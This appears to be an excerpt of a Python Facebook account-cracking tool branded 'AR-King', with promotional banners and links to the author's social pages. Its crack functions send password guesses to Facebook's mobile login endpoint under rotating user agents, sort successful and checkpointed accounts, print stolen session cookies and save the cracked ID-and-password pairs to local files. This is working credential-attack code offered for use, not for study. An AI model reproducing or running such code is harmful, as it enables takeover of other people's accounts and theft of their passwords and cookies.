...
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mJOIN MY FB PAGE GIFT GROUP")
time.sleep(2)
os.system(f'xdg-open https://https://www.facebook.com/princeofficial027')
#------------------[ AR-King ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/abdurrahman.ar27')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mABDUR-RAHMAN   \33[1;38m║\033[1;31m 
╠══[Facebook                 • Md Abdur Rahman║  \033[1;97m  
...
os.system('espeak -a 300 " Welcome,   to,  AR,  King,  Tools"')
pass
...
def menu():
    ...
    if AR in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801728689404')
        os.system("python nono.py")
    elif AR in ['3','03']:
        result()
    elif AR in ['0']:
...
def setting():
    ...
    #os.system("xdg-open https://www.facebook.com/AR.King.Ok.Bro")
    if hc in ['1','01']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[AR•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[AR-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[AR-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " AR,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[AR-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•AR-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•AR-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  AR,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
